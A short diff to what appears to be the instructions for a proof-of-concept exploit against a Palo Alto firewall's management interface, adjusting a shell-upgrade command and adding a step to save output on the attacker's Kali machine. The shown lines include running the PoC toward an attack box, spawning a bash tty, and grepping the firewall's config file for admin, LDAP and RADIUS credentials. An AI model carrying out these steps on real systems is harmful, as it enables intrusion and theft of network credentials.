@@ -248,7 +248,7 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 
    If you do not see the following, its time to troubleshoot.
 
-4. To receive a more usable shell tty, use the following command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+4. To receive a more usable shell tty, use the following command: `python -c 'import pty; pty.spawn("/bin/bash")'`
 
 
 
@@ -394,6 +394,7 @@ Additionally, we copy all outputs from coommands into a text document on our loc
 ```bash
 cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 ```
+Copy the output and paste into a text editor on your kali and save the file.
 
 #### Attempt to pivot through firewall if routing/NAT is enabled
 
